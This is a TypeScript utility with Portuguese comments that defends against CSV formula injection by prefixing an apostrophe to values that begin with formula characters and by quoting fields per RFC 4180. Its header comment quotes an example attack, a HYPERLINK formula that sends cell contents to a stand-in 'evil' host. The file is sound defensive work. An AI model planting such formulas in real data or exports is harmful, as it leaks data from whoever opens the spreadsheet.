/**
 * CSV injection prevention (#49).
 *
 * Valores que começam com `=`, `+`, `-`, `@`, `\t` ou `\r` são interpretados
 * como fórmula pelo Excel/LibreOffice/Sheets ao abrir o CSV. Atacante
 * cadastra razão social = `=HYPERLINK("http://evil/?x="&A1,"click")` e na
 * hora que a equipe exporta o relatório e abre no Excel, um clique vaza
 * dados pra fora.
 *
 * Defesa: prefixar `'` (apóstrofo) nos valores suspeitos. Excel mostra o
 * texto literal e não dispara fórmula. Também escapa aspas (RFC 4180).
 *
 * USO:
 *   const linha = [csvEscape(c.razaoSocial), csvEscape(c.cpfCnpj), …].join(",");
 *
 * Sempre passe TUDO por csvEscape — campos numéricos também (atacante pode
 * setar código = "=SUM(...)" se o input não for typed no banco).
 */
const PERIGOSO_INICIO = /^[=+\-@\t\r]/;

export function csvEscape(value: unknown): string {
  if (value === null || value === undefined) return "";
  let s = typeof value === "string" ? value : String(value);

  // Remove caracteres de controle nulos (poderiam quebrar parsers)
  s = s.replace(/\0/g, "");

  // Prefixa apóstrofo se começar com símbolo perigoso
  if (PERIGOSO_INICIO.test(s)) {
    s = "'" + s;
  }

  // Sempre escapa aspas e envolve em aspas se contém vírgula/aspas/quebra
  if (/[",\r\n]/.test(s)) {
    s = '"' + s.replace(/"/g, '""') + '"';
  }
  return s;
}

/** Gera uma linha CSV (RFC 4180) com escape contra fórmulas. */
export function csvLinha(valores: unknown[]): string {
  return valores.map(csvEscape).join(",");
}
